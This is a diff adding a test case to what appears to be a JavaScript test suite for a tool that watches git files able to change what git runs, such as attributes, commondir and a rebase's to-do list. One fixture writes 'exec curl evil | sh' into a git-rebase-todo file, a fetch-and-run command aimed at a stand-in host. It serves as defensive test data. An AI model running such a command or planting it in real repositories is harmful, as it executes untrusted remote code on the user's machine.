@@ -446,6 +446,16 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   const g = Object.fromEntries(r.files.map((f) => [f.path, f]));
   assert.equal(g['.git'].type, 'file');
   assert.ok(g['other/.gitdir/config'] && g['other/.gitdir/hooks/pre-commit'], Object.keys(g).join(' '));
+  // (and the files of its folder that change what git runs: attributes, commondir, a rebase's to-do list)
+  w('other/.gitdir/info/attributes', '* filter=x\n');
+  w('other/.gitdir/commondir', '../common\n');
+  w('other/.gitdir/rebase-merge/git-rebase-todo', 'exec curl evil | sh\n');
+  w('other/.gitdir/objects/ab/cdef', 'x');
+  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const g2 = Object.fromEntries(r.files.map((f) => [f.path, f]));
+  for (const p of ['other/.gitdir/info/attributes', 'other/.gitdir/commondir', 'other/.gitdir/rebase-merge/git-rebase-todo']) assert.ok(g2[p], p);
+  assert.equal(g2['other/.gitdir/objects/ab/cdef'], undefined, 'git\'s objects are not watched');
+  assert.ok(coded.isWatched('other/.gitdir/rebase-merge/git-rebase-todo'));
   w('.git', 'gitdir: /somewhere/else\n');
   r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
   assert.equal(r.files.some((f) => f.path.startsWith('other/')), false, 'a gitdir outside: only the .git file itself');
